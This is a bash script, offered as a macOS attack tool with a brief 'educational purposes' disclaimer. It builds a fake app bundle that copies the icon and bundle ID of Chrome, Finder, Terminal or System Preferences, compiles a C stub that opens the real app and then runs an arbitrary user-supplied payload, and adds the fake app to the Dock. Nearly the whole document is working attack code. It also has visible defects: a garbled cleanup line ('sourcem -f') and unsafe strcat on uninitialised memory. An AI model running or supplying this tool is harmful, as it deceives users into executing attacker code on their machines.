#!/bin/bash
# Dock Impersonation Script
# Creates a fake application that appears in the Dock
# WARNING: This is for security research and educational purposes only

set -e

if [ $# -lt 1 ]; then
    echo "Usage: $0 <target-app> [payload-command]"
    echo "Example: $0 'Google Chrome' 'whoami > /tmp/privesc'"
    echo ""
    echo "Supported targets:"
    echo "  - Google Chrome"
    echo "  - Finder"
    echo "  - Terminal"
    echo "  - System Preferences"
    exit 1
fi

TARGET_APP="$1"
PAYLOAD="${2:-echo 'Payload executed' > /tmp/dock-impersonation.log}"
TMP_APP="/tmp/Fake${TARGET_APP// /}.app"

echo "=== Dock Impersonation ==="
echo "Target: $TARGET_APP"
echo "Payload: $PAYLOAD"
echo ""

# Clean up any previous attempt
rm -rf "$TMP_APP" 2>/dev/null || true

# Create app structure
echo "[1] Creating app bundle structure..."
mkdir -p "$TMP_APP/Contents/MacOS"
mkdir -p "$TMP_APP/Contents/Resources"

# Determine source app path
case "$TARGET_APP" in
    "Google Chrome")
        SOURCE_APP="/Applications/Google Chrome.app"
        ICON_PATH="$SOURCE_APP/Contents/Resources/app.icns"
        EXECUTABLE_NAME="Google Chrome"
        BUNDLE_ID="com.google.Chrome"
        ;;
    "Finder")
        SOURCE_APP="/System/Library/CoreServices/Finder.app"
        ICON_PATH="$SOURCE_APP/Contents/Resources/Finder.icns"
        EXECUTABLE_NAME="Finder"
        BUNDLE_ID="com.apple.finder"
        ;;
    "Terminal")
        SOURCE_APP="/Applications/Utilities/Terminal.app"
        ICON_PATH="$SOURCE_APP/Contents/Resources/icon.icns"
        EXECUTABLE_NAME="Terminal"
        BUNDLE_ID="com.apple.terminal"
        ;;
    "System Preferences")
        SOURCE_APP="/System/Library/CoreServices/System Preferences.app"
        ICON_PATH="$SOURCE_APP/Contents/Resources/SystemPreferences.icns"
        EXECUTABLE_NAME="System Preferences"
        BUNDLE_ID="com.apple.systempreferences"
        ;;
    *)
        echo "[ERROR] Unsupported target: $TARGET_APP"
        exit 1
        ;;
esac

echo "  Source app: $SOURCE_APP"
echo "  Icon: $ICON_PATH"
echo ""

# Create C payload
echo "[2] Creating malicious executable..."
cat > "$TMP_APP/Contents/MacOS/${EXECUTABLE_NAME}.c" <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // Open the real application in background
    char *open_cmd = "open \"$SOURCE_APP\" & ";
    
    // Execute payload after short delay
    char *payload_cmd = "$PAYLOAD";
    
    char *full_cmd = strcat(strcat(strcat(strcat(strcat(strcat(strcat(
        malloc(512), open_cmd), "sleep 2; "), payload_cmd), "; "),
        "echo 'Payload executed' > /tmp/dock-impersonation.log"), "; "),
        "exit 0");
    
    system(full_cmd);
    return 0;
}
EOF

# Compile the payload
gcc "$TMP_APP/Contents/MacOS/${EXECUTABLE_NAME}.c" -o "$TMP_APP/Contents/MacOS/$EXECUTABLE_NAME" 2>/dev/null || {
    echo "[ERROR] Failed to compile payload (gcc required)"
    rm -rf "$TMP_APP"
    exit 1
}

# Clean up sourcem -f "$TMP_APP/Contents/MacOS/${EXECUTABLE_NAME}.c"

chmod +x "$TMP_APP/Contents/MacOS/$EXECUTABLE_NAME"
echo "  Compiled: $TMP_APP/Contents/MacOS/$EXECUTABLE_NAME"
echo ""

# Create Info.plist
echo "[3] Creating Info.plist..."
cat <<EOF > "$TMP_APP/Contents/Info.plist"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1">
<dict>
    <key>CFBundleExecutable</key>
    <string>$EXECUTABLE_NAME</string>
    <key>CFBundleIdentifier</key>
    <string>$BUNDLE_ID</string>
    <key>CFBundleName</key>
    <string>$TARGET_APP</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF
echo "  Created: $TMP_APP/Contents/Info.plist"
echo ""

# Copy icon
echo "[4] Copying icon..."
if [ -f "$ICON_PATH" ]; then
    cp "$ICON_PATH" "$TMP_APP/Contents/Resources/app.icns"
    echo "  Copied icon from $ICON_PATH"
else
    echo "  [WARNING] Icon not found at $ICON_PATH"
fi
echo ""

# Add to Dock
echo "[5] Adding to Dock..."
# For Finder, add at beginning of array (can't remove real Finder)
# For others, add normally
if [ "$TARGET_APP" = "Finder" ]; then
    # Get current Dock array, insert at beginning
    current=$(defaults read com.apple.dock persistent-apps 2>/dev/null || echo "()")
    new_entry="<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>$TMP_APP</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"
    # This is simplified - in practice you'd need to parse and reconstruct the array
    defaults write com.apple.dock persistent-apps -array-add "$new_entry"
else
    defaults write com.apple.dock persistent-apps -array-add "<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>$TMP_APP</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>"
fi

sleep 0.1
killall Dock 2>/dev/null || true
echo "  Dock refreshed"
echo ""

echo "=== Impersonation Complete ==="
echo ""
echo "Fake app location: $TMP_APP"
echo "The fake app now appears in the Dock. When clicked, it will:"
echo "  1. Open the real $TARGET_APP in the background"
echo "  2. Execute your payload after 2 seconds"
echo ""
echo "To remove:"
echo "  defaults delete com.apple.dock persistent-apps"
echo "  killall Dock"
echo "  rm -rf $TMP_APP"
